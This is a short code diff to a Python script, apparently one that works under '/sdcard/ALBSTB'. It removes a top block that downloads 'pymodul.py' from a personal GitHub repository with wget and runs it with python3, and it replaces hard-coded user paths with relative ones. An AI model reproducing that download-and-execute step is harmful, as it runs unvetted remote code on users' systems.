@@ -1,8 +1,3 @@
-!mkdir ./sdcard
-!mkdir ./sdcard/ALBSTB
-!wget https://github.com/DarshGoswami1982/te/raw/main/pymodul.py
-!python3 pymodul.py
-
 # -*- coding: utf-8 -*-
 import os
 import sys
@@ -35,10 +30,10 @@ def cls():
 
 my_os = platform.system()
 if my_os == "Windows":
-    rootDir = "C://Users//ITI MANGROL"
+    rootDir = "."
     my_os = "Wɪɴᴅᴏᴡs"
 else:
-    rootDir = "/sdcard/"
+    rootDir = "./sdcard/"
     my_os = "Aɴᴅʀᴏɪᴅ"
 # -----------------------[ Header ]----
 
